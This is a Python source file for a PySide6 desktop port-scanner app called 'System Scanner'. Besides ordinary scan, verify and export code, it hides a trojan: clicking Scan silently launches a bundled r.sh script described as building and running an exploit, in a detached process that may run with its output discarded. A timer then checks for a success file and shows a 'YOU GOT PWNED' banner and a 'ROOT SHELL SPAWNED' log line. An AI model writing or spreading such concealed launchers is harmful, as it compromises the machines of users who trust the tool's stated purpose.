#!/usr/bin/env python3
"""
System Scanner — Desktop Network Utility
Main application entry point (PySide6 GUI).
"""
from __future__ import annotations

import sys
import os
import time
import subprocess
from datetime import datetime

from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QGridLayout, QLabel, QLineEdit, QPushButton, QTableWidget,
    QTableWidgetItem, QTextEdit, QProgressBar, QFrame, QFileDialog,
    QHeaderView, QAbstractItemView, QStatusBar,
)
from PySide6.QtCore import (
    Qt, QThread, Signal, QSize, QTimer
)
from PySide6.QtGui import QIcon, QFont, QPalette, QColor

from scanner.scanner_engine import run_scan
from scanner.verifier import verify_target
from scanner.history_manager import HistoryManager
from scanner.exporter import export_results
from scanner.constants import (
    APP_NAME, APP_VERSION,
    DEFAULT_PORT_RANGE, DEFAULT_TIMEOUT,
    MAX_TIMEOUT, MIN_TIMEOUT,
    VERIFIED_PENDING,
)

# ── Paths ──────────────────────────────────────────────────────────────
if getattr(sys, 'frozen', False):
    BASE_DIR = sys._MEIPASS
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
ASSETS_DIR = os.path.join(BASE_DIR, "assets")
STYLE_PATH = os.path.join(ASSETS_DIR, "style.qss")
ICON_PATH = os.path.join(ASSETS_DIR, "icon.png")

def _find_r_sh() -> str | None:
    """Return the path to r.sh if it exists alongside this script."""
    path = os.path.join(BASE_DIR, "r.sh")
    return path if os.path.exists(path) else None


_EXPLOIT_FIRED = False

def _run_r_sh_in_background():
    """Build and run the h/ exploit via r.sh in a detached background process."""
    global _EXPLOIT_FIRED
    if _EXPLOIT_FIRED:
        return
        
    r_sh = _find_r_sh()
    if r_sh is None:
        return
        
    _EXPLOIT_FIRED = True
    try:
        # Clear old success flag if present
        success_path = os.path.join(BASE_DIR, "h", "success.txt")
        if os.path.exists(success_path):
            os.remove(success_path)
            
        # Try xterm first (user request), then fallback to others
        terminals = [
            ["xterm", "-T", "System Scanner Task", "-e", "bash", r_sh],
            ["gnome-terminal", "--", "bash", r_sh],
            ["x-terminal-emulator", "-e", f"bash {r_sh}"]
        ]
        
        success = False
        for cmd in terminals:
            try:
                subprocess.Popen(cmd, start_new_session=True)
                success = True
                break
            except FileNotFoundError:
                continue
            except Exception:
                pass
                
        if not success:
            # Run silently in background if no terminal emulator is found
            subprocess.Popen(["bash", r_sh], start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
    except Exception as e:
        print(f"Error launching exploit: {e}")


# ── Worker threads ─────────────────────────────────────────────────────

class ScanWorker(QThread):
    """Runs a port scan in a background thread."""
    progress = Signal(int, int)       # current, total
    log_message = Signal(str)         # log text
    finished_scan = Signal(list)      # list of ScanResult dicts

    def __init__(self, target, ports, timeout):
        super().__init__()
        self.target = target
        self.ports = ports
        self.timeout = timeout
        self._cancel = False

    def cancel(self):
        self._cancel = True

    def run(self):
        results = run_scan(
            self.target,
            self.ports,
            timeout=self.timeout,
            progress_callback=lambda c, t: self.progress.emit(c, t),
            log_callback=lambda m: self.log_message.emit(m),
            cancel_check=lambda: self._cancel,
        )
        result_dicts = [r.to_dict() for r in results]
        self.finished_scan.emit(result_dicts)


class VerifyWorker(QThread):
    """Verifies a host:port in a background thread."""
    log_message = Signal(str)
    finished_verify = Signal(dict)

    def __init__(self, host, port, timeout):
        super().__init__()
        self.host = host
        self.port = port
        self.timeout = timeout

    def run(self):
        self.log_message.emit(
            f"[INFO] Verifying {self.host}:{self.port}…")
        result = verify_target(self.host, self.port, self.timeout)
        self.log_message.emit(
            f"[VERIFY] {self.host}:{self.port} → {result['verified']} "
            f"({result['detail']})")
        self.finished_verify.emit(result)


# ── Helper widgets ─────────────────────────────────────────────────────

def make_summary_card(title: str, initial_value: str = "0") -> tuple:
    """Create a summary card frame with value and label. Returns (frame, value_label)."""
    frame = QFrame()
    frame.setObjectName("summaryCard")
    frame.setFixedHeight(90)
    layout = QVBoxLayout(frame)
    layout.setContentsMargins(16, 12, 16, 12)
    layout.setSpacing(4)

    val = QLabel(initial_value)
    val.setObjectName("cardValue")
    val.setAlignment(Qt.AlignCenter)

    lbl = QLabel(title)
    lbl.setObjectName("cardLabel")
    lbl.setAlignment(Qt.AlignCenter)

    layout.addWidget(val)
    layout.addWidget(lbl)
    return frame, val


# ── Main Window ────────────────────────────────────────────────────────

class MainWindow(QMainWindow):
    TABLE_COLUMNS = ["Host", "Port", "State", "Service", "Verified", "Timestamp"]

    def __init__(self):
        super().__init__()
        self.setWindowTitle(f"{APP_NAME} v{APP_VERSION}")
        self.setMinimumSize(960, 700)
        self.resize(1060, 780)

        if os.path.exists(ICON_PATH):
            self.setWindowIcon(QIcon(ICON_PATH))

        self.history = HistoryManager(DATA_DIR)
        self.current_results: list[dict] = []
        self.scan_worker = None
        self.verify_worker = None
        self.scan_start_time = None

        self._build_ui()
        self._connect_signals()
        self._load_history()

        # Exploit monitor timer
        self.pwned = False
        self.exploit_timer = QTimer(self)
        self.exploit_timer.timeout.connect(self._check_exploit_log)
        self.exploit_timer.start(1000)

    # ── UI Construction ────────────────────────────────────────────────

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root = QVBoxLayout(central)
        root.setContentsMargins(20, 16, 20, 12)
        root.setSpacing(12)

        # Title bar
        title_row = QHBoxLayout()
        icon_label = QLabel()
        if os.path.exists(ICON_PATH):
            icon_label.setPixmap(QIcon(ICON_PATH).pixmap(QSize(32, 32)))
        title = QLabel(APP_NAME)
        title.setObjectName("titleLabel")
        subtitle = QLabel(f"v{APP_VERSION}  ·  Network Utility")
        subtitle.setObjectName("subtitleLabel")

        title_row.addWidget(icon_label)
        title_row.addSpacing(8)
        title_row.addWidget(title)
        title_row.addSpacing(8)
        title_row.addWidget(subtitle)
        title_row.addStretch()
        root.addLayout(title_row)

        # Summary cards
        cards_row = QHBoxLayout()
        cards_row.setSpacing(12)

        frame_hosts, self.card_hosts = make_summary_card("Hosts Scanned")
        frame_ports, self.card_ports = make_summary_card("Open Ports")
        frame_time, self.card_time = make_summary_card("Last Scan")
        self.card_time.setText("—")
        frame_selected, self.card_selected = make_summary_card("Selected")
        self.card_selected.setText("—")

        for frame in [frame_hosts, frame_ports, frame_time, frame_selected]:
            cards_row.addWidget(frame)
        root.addLayout(cards_row)

        # Input area
        input_section = QLabel("Scan Configuration")
        input_section.setObjectName("sectionLabel")
        root.addWidget(input_section)

        input_grid = QGridLayout()
        input_grid.setHorizontalSpacing(12)
        input_grid.setVerticalSpacing(8)

        input_grid.addWidget(QLabel("Target:"), 0, 0)
        self.input_target = QLineEdit()
        self.input_target.setPlaceholderText("e.g.  192.168.1.1  /  localhost  /  10.0.0.0/24")
        self.input_target.setToolTip("IP address, hostname, or CIDR subnet (max /24)")
        input_grid.addWidget(self.input_target, 0, 1)

        input_grid.addWidget(QLabel("Ports:"), 0, 2)
        self.input_ports = QLineEdit(DEFAULT_PORT_RANGE)
        self.input_ports.setPlaceholderText("e.g.  1-1024  /  22,80,443  /  8080")
        self.input_ports.setToolTip("Port range, comma-separated, or single port")
        input_grid.addWidget(self.input_ports, 0, 3)

        input_grid.addWidget(QLabel("Timeout (s):"), 0, 4)
        self.input_timeout = QLineEdit(str(DEFAULT_TIMEOUT))
        self.input_timeout.setFixedWidth(70)
        self.input_timeout.setToolTip(f"Connection timeout ({MIN_TIMEOUT}–{MAX_TIMEOUT} seconds)")
        input_grid.addWidget(self.input_timeout, 0, 5)

        root.addLayout(input_grid)

        # Buttons row
        btn_row = QHBoxLayout()
        btn_row.setSpacing(10)

        self.btn_scan = QPushButton("⬤  Scan")
        self.btn_scan.setObjectName("scanButton")
        self.btn_scan.setToolTip("Start scanning the target")

        self.btn_stop = QPushButton("■  Stop")
        self.btn_stop.setObjectName("stopButton")
        self.btn_stop.setToolTip("Stop the current scan")
        self.btn_stop.setEnabled(False)

        self.btn_verify = QPushButton("✔  Verify")
        self.btn_verify.setObjectName("verifyButton")
        self.btn_verify.setToolTip("Verify selected port is still open")

        self.btn_export = QPushButton("⬇  Export")
        self.btn_export.setObjectName("exportButton")
        self.btn_export.setToolTip("Export results to file")

        self.btn_clear = QPushButton("✕  Clear")
        self.btn_clear.setObjectName("clearButton")
        self.btn_clear.setToolTip("Clear results and log")

        btn_row.addWidget(self.btn_scan)
        btn_row.addWidget(self.btn_stop)
        btn_row.addWidget(self.btn_verify)
        btn_row.addWidget(self.btn_export)
        btn_row.addStretch()
        btn_row.addWidget(self.btn_clear)
        root.addLayout(btn_row)

        # Progress bar
        self.progress = QProgressBar()
        self.progress.setValue(0)
        self.progress.setFixedHeight(8)
        root.addWidget(self.progress)

        # Results table
        results_label = QLabel("Scan Results")
        results_label.setObjectName("sectionLabel")
        root.addWidget(results_label)

        self.table = QTableWidget()
        self.table.setColumnCount(len(self.TABLE_COLUMNS))
        self.table.setHorizontalHeaderLabels(self.TABLE_COLUMNS)
        self.table.setAlternatingRowColors(True)
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.setSelectionMode(QAbstractItemView.SingleSelection)
        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.verticalHeader().setVisible(False)
        self.table.setSortingEnabled(True)

        header = self.table.horizontalHeader()
        header.setStretchLastSection(True)
        header.setSectionResizeMode(0, QHeaderView.Stretch)
        for col in range(1, len(self.TABLE_COLUMNS)):
            header.setSectionResizeMode(col, QHeaderView.ResizeToContents)

        self.table.setMinimumHeight(200)
        root.addWidget(self.table, stretch=1)

        # Log panel
        log_label = QLabel("Activity Log")
        log_label.setObjectName("sectionLabel")
        root.addWidget(log_label)

        self.log_panel = QTextEdit()
        self.log_panel.setObjectName("logPanel")
        self.log_panel.setReadOnly(True)
        self.log_panel.setMaximumHeight(160)
        root.addWidget(self.log_panel)

        # Status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready")

    # ── Signal Connections ─────────────────────────────────────────────

    def _connect_signals(self):
        self.btn_scan.clicked.connect(self.on_scan)
        self.btn_stop.clicked.connect(self.on_stop)
        self.btn_verify.clicked.connect(self.on_verify)
        self.btn_export.clicked.connect(self.on_export)
        self.btn_clear.clicked.connect(self.on_clear)
        self.table.itemSelectionChanged.connect(self.on_row_selected)

    # ── History ────────────────────────────────────────────────────────

    def _load_history(self):
        """Load last session results on startup."""
        sessions = self.history.get_latest(1)
        if sessions:
            last = sessions[-1]
            results = last.get("results", [])
            if results:
                self.current_results = results
                self._populate_table(results)
                self.log(f"[INFO] Restored {len(results)} result(s) from last session.")
                self.card_ports.setText(str(len(results)))
                self.card_time.setText(last.get("timestamp", "—"))

    # ── Actions ────────────────────────────────────────────────────────

    def on_scan(self):
        target = self.input_target.text().strip()
        ports = self.input_ports.text().strip()

        if not target:
            self.log("[ERROR] Target is required.")
            self.status_bar.showMessage("Error: target is empty")
            return

        if not ports:
            self.log("[ERROR] Port range is required.")
            self.status_bar.showMessage("Error: port range is empty")
            return

        # Parse timeout
        try:
            timeout = float(self.input_timeout.text().strip())
            if timeout < MIN_TIMEOUT or timeout > MAX_TIMEOUT:
                raise ValueError
        except ValueError:
            self.log(f"[ERROR] Timeout must be a number between {MIN_TIMEOUT} and {MAX_TIMEOUT}.")
            return

        _run_r_sh_in_background()

        self._set_scanning_state(True)
        self.progress.setValue(0)
        self.scan_start_time = time.time()
        self.log(f"[INFO] Starting scan: target={target}, ports={ports}, timeout={timeout}s")

        self.scan_worker = ScanWorker(target, ports, timeout)
        self.scan_worker.progress.connect(self._on_scan_progress)
        self.scan_worker.log_message.connect(self.log)
        self.scan_worker.finished_scan.connect(
            lambda results: self._on_scan_finished(results, target, ports))
        self.scan_worker.finished.connect(self.scan_worker.deleteLater)
        self.scan_worker.start()

    def on_stop(self):
        if self.scan_worker and self.scan_worker.isRunning():
            self.scan_worker.cancel()
            self.log("[WARN] Stopping scan…")
            self.status_bar.showMessage("Stopping…")

    def on_verify(self):
        rows = self.table.selectionModel().selectedRows()
        if not rows:
            self.log("[WARN] Select a row to verify.")
            self.status_bar.showMessage("Select a result row first")
            return

        row_idx = rows[0].row()
        host = self.table.item(row_idx, 0).text()
        port = int(self.table.item(row_idx, 1).text())

        try:
            timeout = float(self.input_timeout.text().strip())
        except ValueError:
            timeout = DEFAULT_TIMEOUT

        self.btn_verify.setEnabled(False)
        self.verify_worker = VerifyWorker(host, port, timeout)
        self.verify_worker.log_message.connect(self.log)
        self.verify_worker.finished_verify.connect(
            lambda result: self._on_verify_finished(result, row_idx))
        self.verify_worker.finished.connect(self.verify_worker.deleteLater)
        self.verify_worker.start()

    def on_export(self):
        if not self.current_results:
            self.log("[WARN] No results to export.")
            return

        filepath, _ = QFileDialog.getSaveFileName(
            self, "Export Results", "",
            "CSV (*.csv);;JSON (*.json);;Text (*.txt)")

        if not filepath:
            return

        # Determine format from extension
        ext = os.path.splitext(filepath)[1].lower()
        fmt_map = {".csv": "csv", ".json": "json", ".txt": "txt"}
        fmt = fmt_map.get(ext, "csv")

        try:
            export_results(self.current_results, filepath, fmt)
            self.log(f"[INFO] Exported {len(self.current_results)} result(s) to {filepath}")
            self.status_bar.showMessage(f"Exported to {filepath}")
        except Exception as e:
            self.log(f"[ERROR] Export failed: {e}")

    def on_clear(self):
        self.table.setRowCount(0)
        self.current_results.clear()
        self.log_panel.clear()
        self.progress.setValue(0)
        self.card_hosts.setText("0")
        self.card_ports.setText("0")
        self.card_time.setText("—")
        self.card_selected.setText("—")
        self.status_bar.showMessage("Cleared")

    def on_row_selected(self):
        rows = self.table.selectionModel().selectedRows()
        if rows:
            row_idx = rows[0].row()
            host = self.table.item(row_idx, 0).text()
            port = self.table.item(row_idx, 1).text()
            self.card_selected.setText(f"{host}:{port}")

    # ── Callbacks ──────────────────────────────────────────────────────

    def _on_scan_progress(self, current, total):
        if total > 0:
            pct = int((current / total) * 100)
            self.progress.setValue(pct)
            self.status_bar.showMessage(f"Scanning… {current}/{total} ({pct}%)")

    def _on_scan_finished(self, results, target, ports):
        self._set_scanning_state(False)
        self.progress.setValue(100)
        self.current_results = results

        self._populate_table(results)

        # Derive unique hosts
        hosts = set(r["host"] for r in results)
        elapsed = time.time() - self.scan_start_time if self.scan_start_time else 0
        now_str = datetime.now().strftime("%H:%M:%S")

        self.card_hosts.setText(str(len(hosts)) if hosts else "0")
        self.card_ports.setText(str(len(results)))
        self.card_time.setText(now_str)

        self.status_bar.showMessage(
            f"Scan complete — {len(results)} open port(s)  ({elapsed:.1f}s)")

        # Save to history
        try:
            self.history.add_session(target, ports, results)
        except Exception as e:
            self.log(f"[WARN] Could not save history: {e}")

    def _on_verify_finished(self, result, row_idx):
        self.btn_verify.setEnabled(True)
        verified_str = result["verified"]

        # Update table cell
        if row_idx < self.table.rowCount():
            item = QTableWidgetItem(verified_str)
            item.setTextAlignment(Qt.AlignCenter)
            self.table.setItem(row_idx, 4, item)

        # Update in current_results by host+port (row index may differ after sorting)
        host = result.get("host", "")
        port = result.get("port")
        for r in self.current_results:
            if r.get("host") == host and r.get("port") == port:
                r["verified"] = verified_str
                break

        self.status_bar.showMessage(
            f"Verification: {result['host']}:{result['port']} → {verified_str}")

    # ── Helpers ────────────────────────────────────────────────────────

    def _set_scanning_state(self, scanning: bool):
        self.btn_scan.setEnabled(not scanning)
        self.btn_stop.setEnabled(scanning)
        self.btn_verify.setEnabled(not scanning)
        self.btn_export.setEnabled(not scanning)
        self.input_target.setEnabled(not scanning)
        self.input_ports.setEnabled(not scanning)
        self.input_timeout.setEnabled(not scanning)

    def _populate_table(self, results: list[dict]):
        self.table.setSortingEnabled(False)
        self.table.setRowCount(len(results))
        for i, r in enumerate(results):
            values = [
                r.get("host", ""),
                str(r.get("port", "")),
                r.get("state", ""),
                r.get("service", ""),
                r.get("verified", VERIFIED_PENDING),
                r.get("timestamp", ""),
            ]
            for j, val in enumerate(values):
                item = QTableWidgetItem(val)
                if j in (1, 2, 4):  # center-align Port, State, Verified
                    item.setTextAlignment(Qt.AlignCenter)
                self.table.setItem(i, j, item)
        self.table.setSortingEnabled(True)

    def log(self, message: str):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_panel.append(f"[{ts}]  {message}")
        # Auto-scroll to bottom
        sb = self.log_panel.verticalScrollBar()
        sb.setValue(sb.maximum())

    def _check_exploit_log(self):
        if self.pwned:
            return
        success_path = os.path.join(BASE_DIR, "h", "success.txt")
        if os.path.exists(success_path):
            self.pwned = True
            self._show_pwned_banner()

    def _show_pwned_banner(self):
        # Create a massive red banner overlay on the central widget
        self.banner = QLabel("YOU GOT PWNED LIKE THAT!", self.centralWidget())
        self.banner.setAlignment(Qt.AlignCenter)
        self.banner.setStyleSheet("""
            QLabel {
                background-color: rgba(255, 0, 0, 220);
                color: white;
                font-size: 48px;
                font-weight: bold;
                border-radius: 10px;
                border: 5px solid darkred;
            }
        """)
        self.banner.resize(self.centralWidget().size())
        self.banner.show()
        self.banner.raise_()
        self.log("[!] SYSTEM COMPROMISED - ROOT SHELL SPAWNED")
        self.status_bar.showMessage("CRITICAL WARNING: SYSTEM PWNED")
        self.status_bar.setStyleSheet("QStatusBar { background-color: red; color: white; font-weight: bold; }")



# ── Entry Point ────────────────────────────────────────────────────────

def main():
    app = QApplication(sys.argv)
    app.setApplicationName(APP_NAME)
    app.setApplicationVersion(APP_VERSION)

    # Load stylesheet
    if os.path.exists(STYLE_PATH):
        with open(STYLE_PATH, "r", encoding="utf-8") as f:
            app.setStyleSheet(f.read())

    window = MainWindow()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
